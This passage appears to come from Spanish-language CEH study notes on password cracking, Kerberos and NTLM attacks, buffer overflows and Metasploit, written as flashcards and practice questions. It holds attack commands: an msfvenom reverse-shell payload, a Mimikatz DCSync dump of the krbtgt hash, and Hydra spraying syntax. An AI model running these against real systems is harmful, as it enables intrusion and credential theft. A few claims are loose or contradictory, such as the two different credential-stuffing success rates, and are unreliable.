⚠️ **[Pass-the-Hash vs Pass-the-Ticket]** — PtH usa hashes NTLM para autenticarse sin conocer la contraseña. PtT usa tickets Kerberos (TGT o ST) robados. Son mecanismos distintos aunque el objetivo es el mismo: autenticarse sin credenciales en texto claro.

⚠️ **[AS-REP Roasting vs Kerberoasting]** — El examen los confunde frecuentemente. AS-REP Roasting ataca usuarios con **preauthentication desactivada** y obtiene **TGT** cifrado. Kerberoasting ataca **cuentas de servicio con SPN** y obtiene **TGS** cifrado con RC4. Kerberoasting no requiere ningún privilegio especial, solo una cuenta de dominio válida.

⚠️ **[Golden Ticket vs Silver Ticket]** — Golden Ticket usa el hash de **KRBTGT** y permite crear TGTs para cualquier cuenta del dominio (control total). Silver Ticket falsifica un ST para un servicio específico sin pasar por el KDC. El Golden Ticket es más poderoso.

⚠️ **[Password Spraying vs Brute-Force]** — Brute-force ataca una cuenta con muchas contraseñas. Password Spraying ataca **muchas cuentas con pocas contraseñas** (generalmente una) para evitar el lockout.

⚠️ **[LLMNR UDP 5355 vs NBT-NS UDP 137]** — El examen puede pedir los puertos específicos. LLMNR usa **UDP 5355**; NBT-NS usa **UDP 137**. Ambos son objetivos de Responder.

⚠️ **[EIP Register]** — En un stack-based buffer overflow, el objetivo final del atacante es sobreescribir el **EIP** (Extended Instruction Pointer), que contiene la dirección de la próxima instrucción a ejecutar. Controlar EIP = controlar el flujo del programa.

⚠️ **[Stack vs Heap Overflow]** — Stack: memoria estática, LIFO, afecta a EIP/EBP/ESP, más predecible. Heap: memoria dinámica (`malloc()`), afecta a punteros de objetos y virtual function tables, menos predecible, varía según implementación.

⚠️ **[ROP vs Heap Spraying]** — Ambos bypasan DEP, pero de forma diferente. ROP reutiliza código legítimo existente (gadgets) para ejecutar lógica maliciosa sin inyectar código nuevo. Heap Spraying inunda el heap con copias del payload y redirige la ejecución hacia esa zona.

⚠️ **[Rainbow Table vs DNA Attack]** — Rainbow Table: precalcula hashes y los almacena en tabla para lookup rápido (time-memory trade-off). DNA: distribuye el cracking entre múltiples máquinas en red para usar potencia de cómputo distribuida. Son técnicas offline pero diferentes.

⚠️ **[Password Salting]** — El salt no cifra la contraseña ni la hace más compleja; simplemente hace que el hash resultante sea único para cada usuario aunque tengan la misma contraseña. Esto **invalida las rainbow tables** precalculadas.

⚠️ **[Metasploit Stagers vs Stages]** — El examen puede preguntar qué tipo de payload establece la conexión. Los **Stagers** establecen la conexión de red. Los **Stages** son el payload real descargado por el Stager. Los **Singles** son payloads completos autocontenidos.

⚠️ **[msfvenom flags]** — `-p` = payload, `-f` = formato de output, `-a` = arquitectura, `-b` = bad characters a excluir, `LHOST` = IP del atacante (listener), `LPORT` = puerto de escucha.

⚠️ **[Internal Monologue vs Mimikatz]** — Ambos extraen credenciales NTLM, pero Mimikatz accede directamente a la memoria LSASS (bloqueado por Credential Guard), mientras que Internal Monologue usa SSPI desde user-mode, evadiendo Credential Guard y el antivirus.

---

## 4. Nemotécnicos

**Tipos de password attacks:**
> **N-A-P-O** → **N**on-electronic, **A**ctive online, **P**assive online, **O**ffline

**Pasos del Windows Buffer Overflow Exploitation:**
> **S-F-O-E-B-M-G-G**
> **S**piking → **F**uzzing → **O**ffset → **E**IP overwrite → **B**ad chars → **M**odule → **G**enerate shellcode → **G**ain shell

**Registros de stack (los 5):**
> **"Every Excellent Program Starts Elegantly"**
> **E**BP, **E**SP, **E**IP, **E**SI, **E**DI

**Módulos de Metasploit (7):**
> **"Exploit Payload Auxiliary NOP Encoder Evasion Post"**
> E-P-A-N-E-E-P

**Kerberos attacks:**
> **AS-REP = usuarios sin preauth (TGT)**
> **Kerberoasting = servicios con SPN (TGS)**

**Ticket types:**
> **Golden = KRBTGT hash = todo el dominio**
> **Silver = servicio específico = acceso limitado**

---

## 5. Flashcards

**Q:** ¿Dónde almacena Windows los hashes de contraseñas?
**A:** En la SAM database (`%SystemRoot%\system32\config\SAM`), bajo la clave de registro `HKEY_LOCAL_MACHINE\SAM`.

**Q:** ¿Por qué no se puede copiar el fichero SAM mientras Windows está en ejecución?
**A:** Porque el kernel mantiene un lock exclusivo sobre el fichero SAM que solo se libera con pantalla azul o apagado del sistema.

**Q:** ¿Qué función usa SAM para cifrar parcialmente los hashes?
**A:** SYSKEY (desde Windows NT 4.0).

**Q:** ¿Cuándo se almacena un valor ficticio en el campo LM hash?
**A:** Cuando la contraseña tiene más de 14 caracteres, o cuando LM hashes están deshabilitados (por defecto desde Vista).

**Q:** ¿Qué es el nonce en la autenticación NTLM?
**A:** Una cadena aleatoria de 16 bytes generada por el DC que el cliente cifra con el hash de su contraseña para demostrar su identidad sin transmitirla.

**Q:** ¿Qué diferencia NTLM de Kerberos en cuanto a autenticación mutua?
**A:** Kerberos ofrece autenticación mutua (ambas partes se verifican); NTLM solo autentica al cliente ante el servidor.

**Q:** ¿Qué tipo de ataque usa una sola contraseña contra muchas cuentas para evitar el lockout?
**A:** Password Spraying.

**Q:** ¿Cuál es el flag de hydra para especificar una lista de contraseñas desde un fichero?
**A:** `-P` (mayúscula). `-p` (minúscula) es para una única contraseña.

**Q:** ¿Qué charset de hashcat representa todos los caracteres posibles?
**A:** `?a` (equivale a ?l?u?d?s).

**Q:** ¿En qué se diferencia un mask attack de un brute-force attack?
**A:** El mask attack usa un patrón conocido de la contraseña para reducir el espacio de búsqueda; el brute-force prueba todas las combinaciones posibles sin ningún patrón previo.

**Q:** ¿Qué es un Pass-the-Hash attack?
**A:** Inyectar un hash NTLM comprometido directamente en la autenticación para acceder a sistemas sin conocer la contraseña en texto claro.

**Q:** ¿En qué puertos opera LLMNR y NBT-NS?
**A:** LLMNR: UDP 5355. NBT-NS: UDP 137.

**Q:** ¿Qué herramienta se usa principalmente para LLMNR/NBT-NS poisoning?
**A:** Responder.

**Q:** ¿Qué ataque Kerberos requiere solo una cuenta de dominio válida y ataca cuentas de servicio con SPN?
**A:** Kerberoasting.

**Q:** ¿Qué ataque Kerberos ataca cuentas de usuario con preautenticación deshabilitada?
**A:** AS-REP Roasting.

**Q:** ¿Qué es un Golden Ticket y qué hash se necesita para crearlo?
**A:** Un TGT falsificado que permite acceder a cualquier recurso del dominio. Se necesita el hash NTLM de la cuenta KRBTGT.

**Q:** ¿Qué registro del stack contiene la dirección de la próxima instrucción a ejecutar?
**A:** EIP (Extended Instruction Pointer).

**Q:** ¿Cuál es el objetivo final del atacante en un stack-based buffer overflow?
**A:** Sobreescribir el registro EIP con la dirección de su shellcode malicioso para controlar el flujo de ejecución.

**Q:** ¿Qué comando de msfvenom genera un reverse shell para Windows excluyendo el null byte?
**A:** `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<puerto> EXITFUNC=thread -f c -a x86 -b "\x00"`

**Q:** ¿Qué hace un password salt?
**A:** Añade datos aleatorios a la contraseña antes de hashearla, generando hashes únicos por usuario e invalidando rainbow tables precalculadas.

**Q:** ¿Qué tipo de payload de Metasploit establece la conexión de red con la víctima?
**A:** Stager.

**Q:** ¿Para qué sirve el módulo Encoder de Metasploit?
**A:** Para codificar payloads y evadir detección por antivirus e IDS basados en firmas.

**Q:** ¿Qué técnica reutiliza instrucciones existentes en las librerías del sistema (gadgets) para bypassar DEP?
**A:** Return-Oriented Programming (ROP).

**Q:** ¿Qué herramienta de AD enumeration usa teoría de grafos para visualizar rutas de ataque?
**A:** BloodHound.

**Q:** ¿Qué comando de PowerView lista los miembros del grupo Domain Admins?
**A:** `Get-NetGroupMember -GroupName "Domain Admins"`

**Q:** ¿Qué diferencia hay entre un Silver Ticket y un Golden Ticket?
**A:** Silver Ticket da acceso a un servicio específico; Golden Ticket da acceso a cualquier recurso del dominio. El Golden Ticket necesita el hash de KRBTGT.

---

## 6. Confusión frecuente

**LM Hash vs NTLM Hash** → LM es el más antiguo y débil, deshabilitado por defecto desde Vista. NTLM es su sucesor y más seguro. Ambos se almacenan en el SAM.

**NTLMv1 vs NTLMv2** → Ambos son variantes de NTLM que usan el mismo mecanismo de challenge-response; solo difieren en el nivel de cifrado aplicado. NTLMv2 es el más seguro de los dos.

**Password Spraying vs Brute-Force** → Brute-force = muchas contraseñas contra una cuenta (activa lockout). Spraying = una contraseña contra muchas cuentas (evita lockout).

**AS-REP Roasting vs Kerberoasting** → AS-REP: ataca usuarios sin preauth; obtiene TGT cifrado. Kerberoasting: ataca servicios con SPN; obtiene TGS cifrado con RC4. No requiere privilegios especiales.

**TGT vs TGS (ST)** → TGT (Ticket Granting Ticket): se obtiene tras autenticarse; sirve para pedir servicios sin reintroducir contraseña. TGS/ST (Service Ticket): ticket específico para acceder a un servicio concreto.

**Golden Ticket vs Silver Ticket** → Golden: usa hash KRBTGT, acceso a todo el dominio. Silver: usa hash de cuenta de servicio, acceso a un servicio concreto. Golden es mucho más poderoso.

**Pass-the-Hash vs Pass-the-Ticket** → PtH usa hashes NTLM. PtT usa tickets Kerberos. Ambos evitan usar la contraseña en texto claro, pero explotan protocolos distintos.

**Stack Overflow vs Heap Overflow** → Stack: memoria estática LIFO, sobreescribe EIP, más predecible. Heap: memoria dinámica, sobreescribe punteros de objetos, menos predecible y más variable en explotación.

**Rainbow Table Attack vs Dictionary Attack** → Rainbow Table: busca el hash en una tabla precalculada (time-memory trade-off, muy rápido). Dictionary: calcula el hash de cada palabra durante el ataque (más lento, más flexible).

**Stager vs Stage (Metasploit)** → Stager: establece la conexión de red. Stage: el payload real que el stager descarga y ejecuta (ej. Meterpreter).

**Encoder vs Evasion (Metasploit)** → Encoder: codifica el payload para evitar detección por firmas (byte patterns). Evasion: módulo específico que modifica el comportamiento del payload para evadir defensas concretas (ej. Windows Defender).

**LLMNR vs NBT-NS** → LLMNR: protocolo IPv4/IPv6, UDP 5355, resolución multicast. NBT-NS: protocolo legado NetBIOS, UDP 137. Ambos son explotables con Responder.

**Mimikatz vs Internal Monologue** → Mimikatz accede directamente a memoria LSASS (bloqueado por Credential Guard). Internal Monologue usa SSPI desde user-mode sin tocar LSASS (evade Credential Guard y AV).

**ASLR vs DEP** → ASLR: aleatoriza direcciones de memoria (dificulta predecir dónde está el payload). DEP: marca regiones de memoria como no ejecutables (impide ejecutar código inyectado). ROP bypasa DEP; Heap/JIT Spraying bypasan ASLR.

---

## 7. Técnica Adicional: Credential Stuffing 🔴

**Credential Stuffing** es un ataque que aprovecha las brechas de datos públicas (credential dumps de Pastebin, Dark Web, etc.) para intentar autenticarse en otros servicios, explotando la reutilización de contraseñas por parte de los usuarios.

**Diferencia clave con otros ataques:**
- **Brute-Force:** genera combinaciones de caracteres. No usa credenciales reales.
- **Dictionary Attack:** usa un diccionario de palabras/contraseñas comunes. No usa credenciales reales de usuarios reales.
- **Password Spraying:** usa pocas contraseñas contra muchas cuentas para evitar lockout.
- **Credential Stuffing:** usa **pares usuario:contraseña reales** robados de otras brechas. Asume que el usuario reutiliza la misma contraseña en varios servicios.

**Proceso:**
1. El atacante obtiene un dump de credenciales de una brecha anterior (ej. la brecha de LinkedIn de 2012 con 117M de cuentas).
2. Automatiza el login en el servicio objetivo con cada par credencial del dump.
3. La tasa de éxito es típicamente baja (0.1-2%) pero efectiva a escala masiva (millones de intentos).

**Herramientas:** Sentry MBA, OpenBullet, STORM, Burp Suite (con intruder).
**Defensa:** MFA, detección de anomalías de login, rate limiting, CAPTCHA, monitorización de IP reputation.

> **Distinción examen:** Si el escenario menciona "credenciales robadas de otra brecha" → Credential Stuffing. Si menciona "contraseñas comunes" → Password Spraying. Si menciona "todas las combinaciones posibles" → Brute-Force.

---

## 8. Preguntas de Práctica — Formato CEH

---

### Pregunta 1 — LLMNR Poisoning
Un investigador de seguridad monitorea el tráfico de red y observa que cuando un usuario intenta conectarse a `\\FileServr` (con error tipográfico), el atacante responde a la petición de broadcast. ¿En qué puerto UDP escucha el atacante para capturar estas peticiones de resolución de nombres?

A) UDP 137  
B) UDP 5353  
C) UDP 5355  
D) TCP 445  

> **Respuesta correcta: C** — LLMNR utiliza **UDP 5355**. NBT-NS usa UDP 137. El puerto 5353 es mDNS. El 445 es SMB. El examen puede confundir LLMNR con mDNS o NBT-NS.

---

### Pregunta 2 — Kerberoasting vs AS-REP Roasting
Un atacante con una cuenta de dominio válida quiere obtener hashes crackeables sin necesitar privilegios especiales. Ha identificado que varias cuentas tienen Service Principal Names (SPNs) registrados. ¿Qué ataque debe usar y qué obtiene?

A) AS-REP Roasting; obtiene TGTs cifrados con RC4  
B) Kerberoasting; obtiene TGS tickets cifrados con el hash de la cuenta de servicio  
C) Pass-the-Ticket; obtiene TGTs del KRBTGT  
D) DCSync; obtiene hashes NTLM del Domain Controller  

> **Respuesta correcta: B** — Kerberoasting ataca **cuentas de servicio con SPN** y obtiene **TGS tickets** cifrados con RC4 (hash de la cuenta de servicio). No requiere privilegios especiales, solo una cuenta de dominio válida. AS-REP Roasting ataca cuentas sin preautenticación y obtiene TGTs. DCSync requiere permisos de replicación.

---

### Pregunta 3 — Buffer Overflow: EIP
Durante la explotación de un buffer overflow en un servidor Windows, un tester envía el patrón generado por `pattern_create.rb` y observa que el registro EIP contiene el valor `0x41424344`. ¿Cuál es el siguiente paso en la metodología de explotación?

A) Identificar bad characters enviando todos los bytes de 0x00 a 0xFF  
B) Usar `pattern_offset.rb` con el valor `0x41424344` para determinar el offset exacto  
C) Generar el shellcode con msfvenom excluyendo el null byte  
D) Buscar la instrucción JMP ESP con `!mona find -s "\xff\xe4"`  

> **Respuesta correcta: B** — Tras el fuzzing, cuando EIP muestra un valor del patrón, el siguiente paso es **determinar el offset exacto** con `pattern_offset.rb -l <longitud> -q 0x41424344`. El orden correcto es: Spiking → Fuzzing → **Identificar offset** → Sobreescribir EIP → Bad chars → Módulo → Shellcode → Shell.

---

### Pregunta 4 — Hashcat Charsets
Un analista de seguridad quiere realizar un mask attack con hashcat sobre hashes MD5. Sabe que las contraseñas tienen 8 caracteres y siguen el patrón: primera letra mayúscula, las 5 siguientes minúsculas, y los 2 últimos son dígitos. ¿Cuál es la máscara correcta?

A) `?u?l?l?l?l?l?d?d`  
B) `?a?l?l?l?l?l?d?d`  
C) `?u?a?a?a?a?a?d?d`  
D) `?U?L?L?L?L?L?D?D`  

> **Respuesta correcta: A** — Los charsets de hashcat son: `?u` = mayúsculas, `?l` = minúsculas, `?d` = dígitos. La máscara `?u?l?l?l?l?l?d?d` representa exactamente el patrón descrito: 1 mayúscula + 5 minúsculas + 2 dígitos.

---

### Pregunta 5 — Password Spraying
El equipo de seguridad observa en los logs que en las últimas 2 horas se han producido intentos de login fallidos en 500 cuentas de usuario diferentes, pero cada cuenta solo muestra 1-2 intentos fallidos, todos usando la misma contraseña "Welcome1". Ninguna cuenta ha sido bloqueada. ¿Qué tipo de ataque está ocurriendo?

A) Brute-Force Attack  
B) Dictionary Attack  
C) Password Spraying Attack  
D) Credential Stuffing Attack  

> **Respuesta correcta: C** — **Password Spraying**: una o pocas contraseñas contra muchas cuentas, deliberadamente por debajo del umbral de lockout. Brute-Force: muchas contraseñas contra una cuenta. Dictionary: diccionario de contraseñas contra una o varias cuentas. Credential Stuffing: usa pares usuario:contraseña reales de otras brechas.

---

### Pregunta 6 — Golden Ticket vs Silver Ticket
Un atacante ha comprometido un Domain Controller y ha ejecutado el comando `lsadump::dcsync /domain:corp.local /user:krbtgt`. Con el hash obtenido, ¿qué tipo de ticket puede forjar y cuáles son sus capacidades?

A) Silver Ticket; acceso a cualquier servicio del dominio sin comunicar con el DC  
B) Golden Ticket; acceso a cualquier recurso, grupo o dominio con validez configurable  
C) Golden Ticket; acceso únicamente a los servicios del DC comprometido  
D) Silver Ticket; acceso a todos los servicios Kerberos del dominio  

> **Respuesta correcta: B** — El hash NTLM de **KRBTGT** permite crear **Golden Tickets**, que dan acceso a cualquier recurso, grupo o dominio, con validez definida por el atacante. El Silver Ticket usa el hash de una **cuenta de servicio** (no KRBTGT) y da acceso solo a ese servicio específico.

---

### Pregunta 7 — Metasploit Payload Types
Un pentester ha explotado una vulnerabilidad en un servidor remoto y quiere instalar Meterpreter. Necesita un payload que sea pequeño inicialmente para establecer la conexión de red, y luego descargue el payload completo. ¿Qué tipo de payload debe usar?

A) Single  
B) Stage  
C) Stager  
D) Encoder  

> **Respuesta correcta: C** — Los **Stagers** son payloads pequeños que establecen la conexión de red entre atacante y víctima. Los **Stages** son el payload real (como Meterpreter) descargados por los Stagers. Los **Singles** son payloads autocontenidos completos. Los **Encoders** codifican payloads para evadir detección.

---

### Pregunta 8 — Hydra Flags
Un tester quiere usar THC-Hydra para realizar un password spraying contra un servidor FTP. Tiene una lista de usuarios en `users.txt` y quiere probar solo la contraseña "Summer2024". ¿Qué comando es el correcto?

A) `hydra -l users.txt -p Summer2024 ftp://192.168.1.1`  
B) `hydra -L users.txt -p Summer2024 ftp://192.168.1.1`  
C) `hydra -l users.txt -P Summer2024 ftp://192.168.1.1`  
D) `hydra -L users.txt -P Summer2024 ftp://192.168.1.1`  

> **Respuesta correcta: B** — `-L` (mayúscula) = fichero con lista de logins. `-p` (minúscula) = contraseña única. `-l` (minúscula) = login único. `-P` (mayúscula) = fichero con lista de contraseñas. Para spraying con lista de usuarios y una contraseña: `-L users.txt -p contraseña`.

---

### Pregunta 9 — Rainbow Table Defense
Un administrador de seguridad quiere proteger el sistema de almacenamiento de contraseñas contra ataques de Rainbow Table. ¿Cuál de las siguientes medidas neutraliza específicamente este tipo de ataque?

A) Aumentar la longitud mínima de contraseña a 12 caracteres  
B) Requerir caracteres especiales en las contraseñas  
C) Implementar password salting antes de calcular el hash  
D) Usar algoritmo SHA-256 en lugar de MD5  

> **Respuesta correcta: C** — El **password salting** añade datos aleatorios a la contraseña antes de hashearla, generando hashes únicos para cada usuario aunque tengan la misma contraseña. Esto invalida las rainbow tables precalculadas porque cada hash es único. Aumentar la longitud o usar SHA-256 dificulta el brute-force pero no invalida las rainbow tables.

---

### Pregunta 10 — Internal Monologue vs Mimikatz
Un red teamer necesita extraer credenciales NTLM de un sistema con Windows Credential Guard activado. Mimikatz falla porque intenta acceder directamente a la memoria LSASS. ¿Qué técnica alternativa debe usar?

A) Pass-the-Hash con el hash capturado anteriormente  
B) Internal Monologue Attack, que usa SSPI desde user-mode sin tocar LSASS  
C) LLMNR Poisoning para capturar el hash en la red  
D) Kerberoasting para obtener hashes de cuentas de servicio  

> **Respuesta correcta: B** — **Internal Monologue** evita acceder directamente a LSASS usando la **SSPI (Security Support Provider Interface)** desde user-mode. Esto bypasa Windows Credential Guard y los antivirus que detectan el acceso a LSASS. Pass-the-Hash requiere ya tener el hash. LLMNR Poisoning captura hashes de red. Kerberoasting ataca cuentas de servicio.

---

### Pregunta 11 — WES-NG
Un atacante ya tiene acceso limitado a un sistema Windows y quiere identificar qué exploits de escalada de privilegios son aplicables. Ha ejecutado `systeminfo.exe` y guardado la salida. ¿Qué herramienta usa para identificar los exploits aplicables?

A) `Metasploit local_exploit_suggester`  
B) `WES-NG (Windows Exploit Suggester - Next Generation)`  
C) `BeRoot`  
D) `PEASS-ng (WinPEAS)`  

> **Respuesta correcta: B** — **WES-NG** compara la salida de `systeminfo.exe` con una base de datos de vulnerabilidades y sugiere exploits aplicables al sistema. Comando: `wes systeminfo.txt` o `wes -e systeminfo.txt` para ver solo los que tienen exploits disponibles. local_exploit_suggester es un módulo de Metasploit que requiere sesión Meterpreter activa.

---

### Pregunta 12 — Credential Stuffing
La empresa XYZ sufre una brecha: 15.000 cuentas de usuario acceden correctamente a su plataforma desde IPs de múltiples países en 30 minutos, usando pares usuario:contraseña exactos. El sistema de detección no activó el lockout porque cada cuenta solo tuvo 1 intento de login. ¿Qué tipo de ataque ha ocurrido?

A) Password Spraying  
B) Dictionary Attack  
C) Brute-Force Attack  
D) Credential Stuffing  

> **Respuesta correcta: D** — **Credential Stuffing**: usa pares usuario:contraseña reales de otras brechas, con tasa de éxito alta porque las credenciales son reales (no generadas). La clave es que cada cuenta tiene éxito en el primer intento con credenciales específicas, no genéricas. Password Spraying usa contraseñas comunes, no pares exactos de otras brechas.

